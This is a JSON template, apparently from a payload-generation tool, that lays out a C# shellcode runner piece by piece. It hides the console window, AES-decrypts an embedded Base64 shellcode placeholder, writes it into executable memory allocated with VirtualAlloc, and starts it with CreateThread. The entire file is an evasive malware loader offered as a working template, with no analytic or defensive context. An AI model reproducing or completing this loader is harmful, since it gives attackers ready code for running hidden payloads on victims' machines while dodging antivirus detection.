{
    "ShellcodeRunnerAES": {
      "directives": [
        "using System;",
        "using System.Runtime.InteropServices;",
        "using System.Security.Cryptography;"
      ],

      "function_declarations": [
        "[DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);",
        "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);",
        "[DllImport(\"kernel32.dll\", SetLastError = true)] static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);",
        "[DllImport(\"kernel32.dll\")] static extern int GetLastError();",
        "[DllImport(\"kernel32.dll\")] static extern IntPtr GetConsoleWindow();",
        "[DllImport(\"user32.dll\")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);"
        ],
      "constant_declarations": [
        "const int SW_HIDE = 0;"
      ],
      "code_blocks": {
        "main": [
          "IntPtr hWnd = GetConsoleWindow();",
          "if (hWnd != IntPtr.Zero) ShowWindow(hWnd, SW_HIDE);",
          "string encryptedShellcodeB64 = \"ENCRYPTED_SHELLCODE_B64\";",
          "string keyB64 = \"AES_KEY_B64\";",
          "string ivB64 = \"AES_IV_B64\";",
          "byte[] encryptedShellcode = Convert.FromBase64String(encryptedShellcodeB64);",
          "byte[] key = Convert.FromBase64String(keyB64);",
          "byte[] iv = Convert.FromBase64String(ivB64);",
          "byte[] shellcode = AESDecrypt(encryptedShellcode, key, iv);",
          "if (shellcode == null)",
          "{",
          "    return;",
          "}"
        ],
        "memory_allocation": [
          "IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);",
          "if (mem == IntPtr.Zero)",
          "{",
          "    return;",
          "}"
        ],
        "copy_shellcode": [
          "Marshal.Copy(shellcode, 0, mem, shellcode.Length);"
        ],
        "execute_shellcode": [
          "IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);",
          "if (hThread == IntPtr.Zero)",
          "{",
          "    return;",
          "}"
        ],
        "wait_execution": [
          "WaitForSingleObject(hThread, 0xFFFFFFFF);"
        ]
      },
      "function_definitions": [
        "static byte[] AESDecrypt(byte[] encryptedData, byte[] key, byte[] iv)",
        "{",
        "    try",
        "    {",
        "        using (Aes aesAlg = Aes.Create())",
        "        {",
        "            aesAlg.Key = key;",
        "            aesAlg.IV = iv;",
        "            aesAlg.Mode = CipherMode.CBC;",
        "            aesAlg.Padding = PaddingMode.PKCS7;",
        "            using (ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV))",
        "            {",
        "                return decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);",
        "            }",
        "        }",
        "    }",
        "    catch (Exception ex)",
        "    {",
        "        return null;",
        "    }",
        "}"
      ]
    }
  }
  